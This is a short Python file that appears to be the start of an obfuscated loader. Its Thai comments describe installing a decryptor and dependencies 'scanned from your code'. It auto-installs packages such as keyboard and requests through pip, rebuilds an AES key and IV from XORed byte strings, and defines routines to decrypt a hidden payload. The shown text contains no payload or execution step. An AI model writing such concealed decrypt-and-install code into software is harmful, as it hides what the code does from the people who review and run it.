
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['keyboard', 'ctypes', 'dataclasses', 'ujson', 'httpx', 'subprocess', 'asyncio', 'requests', 'os', 'rich', 'datetime', 'hashlib', 'typing']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'9\x85\xd8\x00(-\x0f\xe6@A\xabJ\xdc\x94\x8a\xcd/U\xda\xd8\xfbI\xdf\xb1\x81\xa2ZR\xc9\x83H\xa0', b'\x00o\xa5\x84\x0c\xa3&c+\xb2\xbc\xa3_\x8do\x8eR\xa7_h\xc9\x1dM\x18\xe4q\x11{Cuq\xb9', b'\xef\xcb\xe7\x7f\x8b\x07\xf3yf\xd0R\xc7\xd0a\xf9p\x01\xe5\xea?\xfdC_\xfe\x95\xe1\x8f\xa2U\x12\x00V'])
_I = _xor([b'V\xdbT\xb8\t]\xb8\x1b\x00\x17IH\x83\xa7\xae\x9d', b'f6\x9203.\xe6\xc5\x00\xd8\x0e\xc39U\x95f'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

